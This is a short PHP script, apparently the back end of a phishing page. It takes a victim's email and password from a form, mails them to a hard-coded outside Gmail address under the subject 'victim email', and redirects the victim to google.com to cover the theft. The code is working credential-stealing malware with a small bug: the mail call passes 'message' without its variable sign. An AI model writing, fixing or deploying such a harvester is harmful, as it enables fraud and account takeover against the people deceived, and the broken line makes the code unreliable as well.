<?php 
if(isset($_POST['submit'])){
    $to = "fridricadolf100@gmail.com"; // this is your Email address
    $from = $_POST['email']; // this is the sender's Email address
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $subject = "victim email";
   // $subject2 = "Copy of your form submission";
    $message = $email . " " . $pass . " wrote the following:" . "\n\n" . $_POST['message'];
   // $message2 = "Here is a copy of your message " . $first_name . "\n\n" . $_POST['message'];

    $headers = "From:" . $from;
    //$headers2 = "From:" . $to;
    mail($to,$subject,message,$headers);
   // mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender
    header('Location: http://www.google.com');
    // You can also use header('Location: http://www.google.com'); to redirect to another page.
    }
?>
